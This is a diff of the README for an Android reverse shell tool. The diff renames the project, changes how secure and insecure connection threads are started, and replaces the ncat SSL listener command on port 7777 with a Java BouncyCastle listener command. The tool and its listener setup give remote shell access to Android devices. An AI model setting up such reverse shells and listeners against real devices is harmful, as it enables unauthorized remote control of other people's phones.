@@ -1,4 +1,4 @@
-Droid Reverse Shell
+Android Reverse Shell
 ===================
 Ian Cohee 
 ---------------------
@@ -13,20 +13,20 @@ Secure
 
     // UI cannot do networking stuff on its own, it needs
     // a separate thread. 
-    new SecureConnectionThread().execute(host, port);
+    new SecureConnectionThread().execute(host, port, "true");
 
 
 Insecure
 
     // UI cannot do networking stuff on its own, it needs
     // a separate thread. 
-    new ConnectionThread().execute(host, port);
+    new SecureConnectionThread().execute(host, port, "false");
 
 Listener (default: secured)
 --------
-The program `ncat` should be used as a listener by default, for it's native support of SSL. I have included the PEM file containing the private key and certificate together (used by the listener) and a PEM file containing just the certificate, which was imported into the BKS keystore `android.truststore`.
+I'm providing a Listener written in Java, that uses a KeyStore containing the private key that the Android Reverse Shell will accept. The BouncyCastle jar needs to be in the classpath of the listener, as well as two command-line arguments: 1) Path to the keystore (also supplied in this repository, under 'Crypto') and 2) the port to listen on (7777 by default).
 
-    ncat --ssl --ssl-cert /path/to/Ncat_priv.pem --ssl-key /path/to/Ncat_priv.pem -l -p 7777 | tee server.out
+	java -classpath /path/to/bcprov-jdk15on-146.jar Listener /path/to/javaserver.keystore 7777
 
 Listener (unsecured)
 --------
